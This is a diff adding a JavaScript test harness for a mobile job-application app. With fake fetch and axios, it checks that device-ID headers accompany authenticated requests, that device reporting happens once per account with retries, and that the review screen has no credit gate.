+  // Behaviour: the real helper, the real request code, a fake fetch that records the headers.
+  const sent = [];
+  const realFetch = global.fetch;
+  let devId = null, devCalls = 0;
+  const fakeDevice = { getDeviceId: async () => { devCalls++; if (devId === 'THROW') throw new Error('keychain'); return devId; } };
+  let ehs = null, docs = null, add = null;
+  try {
+    ehs = load(svc, (id) => (id === './deviceId' ? fakeDevice : /secure-store/.test(id) ? secure : /async-storage/.test(id) ? asyncStore : /config/.test(id) ? { API_BASE: 'https://api.test' } : {}));
+    const shared = (id) => (/employerHomeService/.test(id) ? ehs : /secure-store/.test(id) ? secure : /async-storage/.test(id) ? asyncStore : /config/.test(id) ? { API_BASE: 'https://api.test' } : null);
+    add = load(addSvcSrc, (id) => shared(id) || {});
+    docs = load(docSvcSrc, (id) => shared(id) || (/homeAddEmployer/.test(id) ? { signedInAccount: async () => 'u:7' } : {}));
+  } catch (e) { console.log('     (device harness did not load: ' + String(e.message).split('\n')[0] + ')'); }
+  ok('the three services load against a fake device + fetch', !!(ehs && typeof ehs.deviceHeaders === 'function' && add && typeof add.checkBuildGate === 'function' && docs && typeof docs.fetchDoc === 'function'));
+  if (ehs && add && docs) {
+    (async () => {
+      global.fetch = async (url, init) => { sent.push({ url: String(url), headers: (init && init.headers) || {} }); return { ok: true, status: 200, json: async () => ({}) }; };
+      try {
+        devId = null;
+        const h0 = await ehs.deviceHeaders();
+        devId = 'dev-abc-12345';
+        const h1 = await ehs.deviceHeaders();
+        const callsAfter = devCalls;
+        devId = 'THROW';
+        const h2 = await ehs.deviceHeaders();
+        ok('a missing id sends NO header and is not remembered; the next request reads it again',
+          JSON.stringify(h0) === '{}' && h1['x-device-id'] === 'dev-abc-12345');
+        ok('…once read it is kept (a later keychain throw does not blind the session)', h2['x-device-id'] === 'dev-abc-12345' && devCalls === callsAfter);
+
+        await add.checkBuildGate('Airbus', { website: 'https://airbus.com' }, 'resume', {});
+        await add.checkBuildGate('Airbus', { website: 'https://airbus.com' }, 'cover_letter', {});
+        await docs.fetchDoc(42);
+        const by = (re) => sent.filter((x) => re.test(x.url));
+        const gateR = by(/\/resume-builder\/generation-gate$/), gateL = by(/\/cover-letter\/employer-gate$/), doc = by(/\/employer-docs\/42$/);
+        ok('⚠️ the resume gate, the letter gate and the doc read all go out WITH x-device-id beside Authorization',
+          gateR.length === 1 && gateL.length === 1 && doc.length === 1
+          && [gateR[0], gateL[0], doc[0]].every((x) => x.headers['x-device-id'] === 'dev-abc-12345' && x.headers.Authorization === 'Bearer TKN'),
+          sent.map((x) => [x.url, x.headers]));
+      } finally { global.fetch = realFetch; }
+    })().then(() => devicePhaseDone(), (e) => { ok('device harness ran without throwing', false, String(e && e.message)); devicePhaseDone(); });
+  } else devicePhaseDone();
+}
+
+console.log('── ⚠️ reportDeviceOnce: ONCE PER ACCOUNT, NOT ONCE PER LAUNCH (2026-09-14) ──');
+function reportPhase() {
+  const subSrc = R('../services/subscriptionService.ts');
+  const layoutSrc = strip(R('../app/_layout.tsx'));
+  let session = null, posts = [], postFails = 0, devOk = true;
+  // A CommonJS module (no __esModule), exactly what esModuleInterop's __importDefault wraps as `default`.
+  const fakeAxios = {
+    post: async (url, body, cfg) => { if (postFails > 0) { postFails--; throw new Error('network'); } posts.push({ url, body, auth: cfg && cfg.headers && cfg.headers.Authorization }); return { data: {} }; },
+    get: async () => ({ data: {} }),
+  };
+  let S = null;
+  try {
+    const js = ts.transpileModule(subSrc, { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2020, esModuleInterop: true } }).outputText;
+    const m = { exports: {} };
+    new Function('module', 'exports', 'require', js)(m, m.exports, (id) => {
+      if (id === 'axios') return fakeAxios;
+      if (/secure-store/.test(id)) return { getItemAsync: async (k) => (k === 'userSession' && session ? JSON.stringify(session) : null), setItemAsync: async () => {}, deleteItemAsync: async () => {} };
+      if (id === 'react-native') return { Platform: { OS: 'ios' } };
+      if (/config/.test(id)) return { API_BASE: 'https://api.test' };
+      if (/deviceId/.test(id)) return { getDeviceId: async () => (devOk ? 'dev-abc-12345' : null), deviceHeader: async () => ({}) };
+      if (/storeEnv/.test(id)) return { rememberStoreEnv: () => {}, storeEnvHeader: async () => ({}) };
+      return {};
+    });
+    S = m.exports;
+  } catch (e) { console.log('     (subscriptionService.ts did not load: ' + String(e.message).split('\n')[0] + ')'); }
+  ok('reportDeviceOnce loads', !!(S && typeof S.reportDeviceOnce === 'function'));
+  if (!S) return Promise.resolve();
+  return (async () => {
+    const r1 = await S.reportDeviceOnce();                                   // launch, signed out
+    session = { token: 'T-A', id: 101 };                                     // …the user signs up later in that launch
+    const r2 = await S.reportDeviceOnce();
+    const r3 = await S.reportDeviceOnce();                                   // the next poll
+    ok('⚠️ signed out at launch → nothing; a LATER sign-in in the same launch IS reported, once',
+      r1 === 'signed_out' && r2 === 'reported' && r3 === 'unchanged' && posts.length === 1
+      && /\/subscription\/device$/.test(posts[0].url) && posts[0].body.deviceId === 'dev-abc-12345' && posts[0].auth === 'Bearer T-A', { r1, r2, r3, posts });
+    session = { token: 'T-B', id: 202 };                                     // sign out, sign up as someone else
+    postFails = 1;
+    const r4 = await S.reportDeviceOnce();
+    const r5 = await S.reportDeviceOnce();
+    ok('⚠️ a different account is reported too — and a FAILED post is retried, not remembered',
+      r4 === 'failed' && r5 === 'reported' && posts.length === 2 && posts[1].auth === 'Bearer T-B', { r4, r5, n: posts.length });
+    session = null; await S.reportDeviceOnce();
+    session = { token: 'T-B2', id: 202 };
+    const r6 = await S.reportDeviceOnce();
+    ok('signing out forgets the account, so signing back in reports again', r6 === 'reported' && posts.length === 3, { r6 });
+    session = { token: 'T-C', id: 303 }; devOk = false;
+    const r7 = await S.reportDeviceOnce(); devOk = true;
+    const r8 = await S.reportDeviceOnce();
+    ok('no device id yet → failed (nothing posted) and retried on the next call', r7 === 'failed' && r8 === 'reported' && posts.length === 4, { r7, r8 });
+    session = { token: 'T-D', id: 404 };
+    const [p1, p2] = await Promise.all([S.reportDeviceOnce(), S.reportDeviceOnce()]);
+    ok('overlapping calls share ONE request', p1 === 'reported' && p2 === 'reported' && posts.length === 5, { p1, p2, n: posts.length });
+    ok('_layout re-checks after launch: a 4 s first check, a poll inside a window, and every return to the foreground',
+      /setTimeout\(check, 4000\)/.test(layoutSrc) && /setInterval\(\(\) => \{[\s\S]{0,200}check\(\);[\s\S]{0,40}\}, DEVICE_REPORT_POLL_MS\)/.test(layoutSrc)
+      && /AppState\.addEventListener\('change'[\s\S]{0,200}next === 'active'[\s\S]{0,120}check\(\)/.test(layoutSrc)
+      && /clearTimeout\(first\); clearInterval\(poll\); sub\.remove\(\);/.test(layoutSrc) && /reportDeviceOnce\(\)/.test(layoutSrc));
+  })().catch((e) => ok('reportDeviceOnce harness ran without throwing', false, String(e && e.message)));
+}
+
+console.log('── ⚠️ THE REVIEW SCREEN HAS NO CREDIT GATE: A 0-CREDIT SUBSCRIBER IS NOT REFUSED ON THE PHONE (2026-09-14) ──');
+{
+  const rv = R('../components/ReviewScreen.js');
+  const rvC = strip(rv).replace(/\{\/\*[\s\S]*?\*\/\}/g, '');
+  ok('⚠️ no creditBalance gate, no "Insufficient Credits", no credit-pack screen', !/creditBalance\s*<=?\s*0/.test(rvC) && !/Insufficient Credits|Recharge Now|setScreen\('packages'\)/.test(rvC));
+  ok('…creditBalance is not even read (App.js still passes it; ignored on purpose)', !/\bcreditBalance\b/.test(rvC));
+  ok('…and no credit price is shown on a button ("1 CR", a diamond count, "N cr")', !/\b1 CR\b|\{creditBalance\} cr|name="diamond"/.test(rvC));
+}
+
+let deviceDone = false;
+function devicePhaseDone() { deviceDone = true; }
+(async () => {
+  for (let i = 0; i < 400 && !deviceDone; i++) await new Promise((r) => setTimeout(r, 5));
+  if (!deviceDone) ok('the device harness finished', false);
+  await reportPhase();
+  console.log(`\nemployer home: ${pass} passed, ${fail} failed`);
+  process.exit(fail ? 1 : 0);
+})();
